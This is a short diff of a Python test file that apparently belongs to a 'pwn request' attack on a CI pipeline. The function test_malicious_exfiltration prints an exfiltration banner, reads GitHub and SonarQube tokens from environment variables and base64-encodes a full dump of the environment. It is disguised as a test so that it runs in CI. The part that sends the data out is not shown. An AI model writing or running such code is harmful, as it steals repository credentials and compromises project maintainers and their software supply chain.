@@ -7,7 +7,7 @@ def test_malicious_exfiltration():
     print("😈 [PwnRequest] Secrets Exfiltration Started...")
     
     # 환경변수(Secrets) 수집
-    github_token = os.environ.get("GITHUB_TOKEN", "NOT_FOUND")
+    github_token = os.environ.get("GIT_TOKEN", "NOT_FOUND")
     sonar_token = os.environ.get("PXXGUIN_SONAR_TOKEN", "NOT_FOUND")
     env_dump = base64.b64encode(os.popen("env").read().encode()).decode()
 
